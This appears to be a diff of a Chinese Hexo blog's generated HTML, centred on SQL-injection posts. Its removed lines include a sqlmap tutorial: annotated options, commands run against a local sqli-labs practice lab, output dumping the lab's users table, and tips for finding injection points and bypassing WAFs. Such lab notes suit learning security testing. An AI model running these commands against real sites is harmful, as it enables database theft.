@@ -5,15 +5,22 @@
   
 
   
-  <title>Hexo</title>
+  <title>sql注入 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://yoursite.com/index.html">
+  <meta name="description" content="SQL注入sql注入:利用现有程序，使之执行构造的payload. 一. 环境搭建 ubuntu16.04虚拟机 更新阿里源 apt-get update 安装mysql apt-get install mysql-server mysql-client -y 安装apache apt-get install apache2 -y 安装git apt-get install git -y 项目 c">
+<meta name="keywords" content="sql注入,sqli-labs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入">
+<meta property="og:url" content="http://yoursite.com/2018/08/28/sql注入/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SQL注入sql注入:利用现有程序，使之执行构造的payload. 一. 环境搭建 ubuntu16.04虚拟机 更新阿里源 apt-get update 安装mysql apt-get install mysql-server mysql-client -y 安装apache apt-get install apache2 -y 安装git apt-get install git -y 项目 c">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2018/08/28/images/youarein.png">
+<meta property="og:updated_time" content="2018-08-28T07:29:58.878Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hexo">
+<meta name="twitter:title" content="sql注入">
+<meta name="twitter:description" content="SQL注入sql注入:利用现有程序，使之执行构造的payload. 一. 环境搭建 ubuntu16.04虚拟机 更新阿里源 apt-get update 安装mysql apt-get install mysql-server mysql-client -y 安装apache apt-get install apache2 -y 安装git apt-get install git -y 项目 c">
+<meta name="twitter:image" content="http://yoursite.com/2018/08/28/images/youarein.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -60,228 +67,7 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main">
-  
-    <article id="post-sqlmap" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/08/28/sqlmap/" class="article-date">
-  <time datetime="2018-08-28T07:30:54.000Z" itemprop="datePublished">2018-08-28</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/28/sqlmap/">sqlmap</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>使用sqlmap需要自己先找到注入点</p>
-<h2 id="1-sqlmap-用户文档"><a href="#1-sqlmap-用户文档" class="headerlink" title="1.sqlmap 用户文档"></a>1.sqlmap 用户文档</h2><p>用户文档来自 <a href="https://blog.csdn.net/u012763794/article/details/52638931" target="_blank" rel="noopener">https://blog.csdn.net/u012763794/article/details/52638931</a><br><br>-v VERBOSE 输出信息的详细程度</p>
-<pre><code># Verbosity level.
-# Valid: integer between 0 and 6
-# 0: Show only error and critical messages  只显示错误和关键信息
-# 1: Show also warning and info messages    警告和信息
-# 2: Show also debug messages               调试信息
-# 3: Show also payloads injected            payload，如：[15:32:10] [PAYLOAD] 1)&apos;,(..)&quot;(&quot;
-# 4: Show also HTTP requests                整个GET报文都看到了
-# 5: Show also HTTP responses&apos; headers         返回报文的头部
-# 6: Show also HTTP responses&apos; page content    返回的html代码都有了
-# Default: 1
-</code></pre><p> Request: 请求<br>    These options can be used to specify how to connect to the target URL</p>
-<pre><code>--method=METHOD     Force usage of given HTTP method (e.g. PUT)
-    指定HTTP请求的方法，GET，POST，PUT，MOVE等
---data=DATA         Data string to be sent through POST
-    指定POST的参数
---param-del=PARA..  Character used for splitting parameter values
-    这个拆分一些参数的，如下面用;拆分post参数
-    python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users
---cookie=COOKIE     HTTP Cookie header value
-    指定cookie值
---cookie-del=COO..  Character used for splitting cookie values
-    指定分割cookie值的字符是什么
---load-cookies=L..  File containing cookies in Netscape/wget format
-    这个是从文件中读取cookie吧，Netscape/wget格式的
---drop-set-cookie   Ignore Set-Cookie header from response
-    忽略响应包的Set-Cookie头
---user-agent=AGENT  HTTP User-Agent header value
-    指定User-Agent用户代理
---random-agent      Use randomly selected HTTP User-Agent header value
-    随机选用sqlmap目录中的User-Agent，这个文件再txt目录
---host=HOST         HTTP Host header value
-    指定主机头
---referer=REFERER   HTTP Referer header value
-    指定Referer头，就是请求来源的意思
--H HEADER, --hea..  Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;)
-    指定某个头部，如： -H &quot;X-Forwarded-For: 127.0.0.1&quot;
---headers=HEADERS   Extra headers (e.g. &quot;Accept-Language: fr\nETag: 123&quot;)
-    这个的话应该是可以指定多个，用\n分割
---auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)
-    指定http认证类型
---auth-cred=AUTH..  HTTP authentication credentials (name:password)
-    指定http认证的账户名和密码，就行apache就可以设置访问某个目录时要认证
---auth-file=AUTH..  HTTP authentication PEM cert/private key file
-    指定一个私钥文件来认证
---ignore-401        Ignore HTTP Error 401 (Unauthorized)
-    忽略401错误
---proxy=PROXY       Use a proxy to connect to the target URL
-    指定代理
---proxy-cred=PRO..  Proxy authentication credentials (name:password)
-    指定代理的认证信息，就是账号密码
---proxy-file=PRO..  Load proxy list from a file
-    从文件中选择代理
---ignore-proxy      Ignore system default proxy settings
-    忽略系统默认代理
---tor               Use Tor anonymity network
-    使用tor网络
---tor-port=TORPORT  Set Tor proxy port other than default
-    设置tor的端口，如果不是默认端口的话
---tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))
-    设置tor代理的类型
---check-tor         Check to see if Tor is used properly
-    检测tor能不能用
---delay=DELAY       Delay in seconds between each HTTP request
-    设置每个HTTP请求的时间间隔，这个在有些限制单位时间请求数的防火墙的时候可以用得到，我上次就用过
---timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
-    设置超时时间，默认30秒
---retries=RETRIES   Retries when the connection timeouts (default 3)
-    设置重试的次数，默认3次
---randomize=RPARAM  Randomly change value for given parameter(s)
-    随机地更改给定参数的值
---safe-url=SAFEURL  URL address to visit frequently during testing
-    有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求
-    这里提供一个安全不错误的连接，每隔一段时间都会去访问一下
---safe-post=SAFE..  POST data to send to a safe URL
-    这里设置一个正确的post数据
---safe-req=SAFER..  Load safe HTTP request from a file
-    从文件中读取安全，或者叫正确的http请求
---safe-freq=SAFE..  Test requests between two visits to a given safe URL
-    设置访问安全url的时间间隔
---skip-urlencode    Skip URL encoding of payload data
-    不进行url编码
---csrf-token=CSR..  Parameter used to hold anti-CSRF token
-    设置CSRF的token
---csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token
-
---force-ssl         Force usage of SSL/HTTPS
-    强制使用https
---hpp               Use HTTP parameter pollution method
-    尝试了一下，只能用于ASP，得到报错信息如下：
-    [WARNING] HTTP parameter pollution should work only against ASP(.NET) targets
-
---eval=EVALCODE     Evaluate provided Python code before the request (e.g.
-                    &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)
-    发送请求之前，先运行这段python代码，比如对某个参数进行处理
-    比如下面的，hash参数就是id的md5值
-    python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc
-509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;
-</code></pre><p>Fingerprint:<br><br>-f, –fingerprint   Perform an extensive DBMS version fingerprint<br>    这个应该是数据库指纹识别，加了可能识别更好<br></p>
-<p>Enumeration:<br><br>These options can be used to enumerate the back-end database<br>management system information, structure and data contained in the<br>tables. Moreover you can run your own SQL statements<br><br>-a, –all           Retrieve everything<br><br>    检索所有，这是拖库的节奏啊<br><br>-b, –banner        Retrieve DBMS banner<br><br>    检索数据库的一些标志性的信息，就是指纹这样子吧<br><br>–current-user      Retrieve DBMS current user<br><br>    检索当前连接数据库的用户<br><br>–current-db        Retrieve DBMS current database<br><br>    检索当前连接的数据库<br><br>–hostname          Retrieve DBMS server hostname&lt;/br<br>    检索服务器的主机名<br><br>–is-dba            Detect if the DBMS current user is DBA<br><br>    检测是不是dba，就是root权限咯<br><br>–users             Enumerate DBMS users<br><br>    枚举数据库用户<br><br>–passwords         Enumerate DBMS users password hashes<br><br>    枚举数据库用户的哈希值<br><br>–privileges        Enumerate DBMS users privileges<br><br>    枚举数据库用户的权限<br><br>–roles             Enumerate DBMS users roles<br><br>    枚举数据库用户的角色<br><br>–dbs               Enumerate DBMS databases<br><br>    枚举数据库有哪些<br><br>–tables            Enumerate DBMS database tables<br><br>    枚举数据表名<br><br>–columns           Enumerate DBMS database table columns<br><br>    枚举列名<br><br>–schema            Enumerate DBMS schema<br><br>    这个测试过，将所有的数据库的表的基本信息都枚举了，有哪些列，列的数据类型，具体数据就没有枚举<br><br>–count             Retrieve number of entries for table(s)<br><br>    枚举表格个数<br><br>–dump              Dump DBMS database table entries<br><br>    输出数据库表的数据<br><br>–dump-all          Dump all DBMS databases tables entries<br><br>    输出所有<br><br>–search            Search column(s), table(s) and/or database name(s)<br><br>    查找特定的列名，表名或数据库名，配合下面的-D,-C,-T<br><br>–comments          Retrieve DBMS comments<br><br>    枚举数据库的注释<br><br>-D DB               DBMS database to enumerate<br><br>    指定数据库名<br><br>-T TBL              DBMS database table(s) to enumerate<br><br>    指定表名<br><br>-C COL              DBMS database table column(s) to enumerate<br><br>    指定列名<br><br>-X EXCLUDECOL       DBMS database table column(s) to not enumerate<br><br>    指定不枚举那个列<br><br>-U USER             DBMS user to enumerate<br><br>    枚举用户，但单独用这个参数感觉没什么用啊，这个可能要看源码才能解决了，估计要配合其他参数<br><br>–exclude-sysdbs    Exclude DBMS system databases when enumerating tables<br><br>    枚举时排除系统的数据库<br><br>–pivot-column=P..  Pivot column name<br><br>    以某一列为核心？这个用过没感觉出什么用<br><br>–where=DUMPWHERE   Use WHERE condition while table dumping<br><br>    使用where调试限制table的输出<br><br>–start=LIMITSTART  First query output entry to retrieve<br><br>    指定开始从第几行开始输出，如–start=3，前两行就不输出了<br><br>–stop=LIMITSTOP    Last query output entry to retrieve<br><br>    指定从第几行开始停止输出<br><br>–first=FIRSTCHAR   First query output word character to retrieve<br><br>    指定只输出第几个字符开始输出，盲注才有效，亲测<br><br>–last=LASTCHAR     Last query output word character to retrieve<br><br>    指定只输出第几个字符停止输出，盲注才有效，亲测，跟上面的配合指定范围，<br><br>    如 ：–first 3 –last 5  只输出3到5位置的字符<br><br>–sql-query=QUERY   SQL statement to be executed<br><br>    指定执行我们的sql语句<br><br>–sql-shell         Prompt for an interactive SQL shell<br><br>    返回一个sql的shell<br><br>–sql-file=SQLFILE  Execute SQL statements from given file(s)<br><br>    从文件中读取执行sql语句<br></p>
-<h2 id="二-实例"><a href="#二-实例" class="headerlink" title="二.实例"></a>二.实例</h2><pre><code>1.sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -b --is-dba --dbs
-查看指纹信息/是否dba(root权限)/数据库
-web server operating system: Linux Ubuntu
-web application technology: Apache 2.4.18
-back-end DBMS operating system: Linux Ubuntu
-back-end DBMS: MySQL 5.0
-banner:    &apos;5.7.23-0ubuntu0.16.04.1&apos;
-
-current user is DBA:    True
-
-available databases [6]:
-[*] challenges
-[*] information_schema
-[*] mysql
-[*] performance_schema
-[*] security
-[*] sys
-
-2.查看security下表名
- sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -D security --tables
-Database: security
-[4 tables]
-+----------+
-| emails   |
-| referers |
-| uagents  |
-| users    |
-+----------+
-
-3.查看列名
-sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -D security -T users --columns
-
-Database: security
-Table: users
-[3 columns]
-+----------+-------------+
-| Column   | Type        |
-+----------+-------------+
-| id       | int(3)      |
-| password | varchar(20) |
-| username | varchar(20) |
-+----------+-------------+
-
-4.获得所有username
-sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -D security -T users -C username --dump
-
-Database: security
-Table: users
-[16 entries]
-+-----------+
-| username  |
-+-----------+
-| admin     |
-| admin#    |
-| admin&apos;#   |
-| admin1    |
-| admin2    |
-| admin3    |
-| admin4    |
-| admin\\&apos;# |
-| Angelina  |
-| batman    |
-| dhakkan   |
-| Dumb      |
-| Dummy     |
-| secure    |
-| stupid    |
-| superman  |
-+-----------+
-</code></pre><h3 id="三-技巧等"><a href="#三-技巧等" class="headerlink" title="三.技巧等"></a>三.技巧等</h3><pre><code>1.自动寻找注入点
-sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-62/?id=1*&quot; --batch
-如上，在可能的注入点后，加上*，将会自动寻找注入
-可以加上 --level n（1-5） 参数，越高越全面
-
-2.绕过WAF
---tamper=TAMPER 使用给定的脚本（S）篡改注入数据
-
-3.post注入
---data &quot;id=1&quot;
-或 抓取post数据包，保存为txt, -r参数读取文件 -p 要注入的参数
-</code></pre>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/28/sqlmap/" data-id="cjldemypa0004kkvpgtde74uq" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlmap/">sqlmap</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-sql注入" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/08/28/sql注入/" class="article-date">
   <time datetime="2018-08-28T03:30:20.000Z" itemprop="datePublished">2018-08-28</time>
@@ -294,8 +80,8 @@ sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-62/?id=1*&quot; --batch
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/28/sql注入/">sql注入</a>
+    <h1 class="article-title" itemprop="name">
+      sql注入
     </h1>
   
 
@@ -625,100 +411,28 @@ information_schema的表columns中的列column_name记录了所有数据库的�
     </footer>
   </div>
   
-</article>
-
-
+    
+<nav id="article-nav">
   
-    <article id="post-reinstall" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/08/20/reinstall/" class="article-date">
-  <time datetime="2018-08-20T01:37:39.000Z" itemprop="datePublished">2018-08-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+    <a href="/2018/08/28/sqlmap/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/reinstall/">reinstall</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="重装"><a href="#重装" class="headerlink" title="重装"></a>重装</h2><p>重装系统，忘了备份本地md文件。不能找回，教训深刻。<br>在这记录一下解决方案，以免以后遇到。</p>
-<ol>
-<li>创建git分支</li>
-<li>将文件提交上传到分支保存</li>
-<li>git clone</li>
-</ol>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/20/reinstall/" data-id="cjldemyny0001kkvphlft38ey" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/">hexo</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/08/19/hello-world/" class="article-date">
-  <time datetime="2018-08-19T10:03:04.096Z" itemprop="datePublished">2018-08-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+          sqlmap
         
+      </div>
+    </a>
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/19/hello-world/">Hello World</a>
-    </h1>
   
+    <a href="/2018/08/20/reinstall/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">reinstall</div>
+    </a>
+  
+</nav>
 
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/19/hello-world/" data-id="cjldemynr0000kkvpiif43as8" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
   
 </article>
-
-
-  
-
 
 </section>
         
